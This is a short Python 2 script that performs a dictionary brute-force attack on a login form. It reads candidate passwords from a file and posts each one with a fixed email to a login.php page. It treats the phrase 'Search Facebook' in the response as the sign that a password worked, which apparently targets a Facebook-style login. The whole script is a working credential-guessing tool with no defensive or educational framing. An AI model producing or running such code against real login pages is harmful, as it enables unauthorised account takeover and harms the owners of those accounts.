import requests

url = 'https://haxcoderyeah.000webhostapp.com/login.php'
exploit = open('password.txt','r').readlines()

for line in exploit:
	password = line.strip()
	http = requests.post(url, data={'email' : 'yow', 'pass': password , 'login': 'submit'})
	content = http.content
	
	if 'Search Facebook' in content:
		print "password found" + password + "  "
		break
	else:
		print "password invalid" + password + "  "
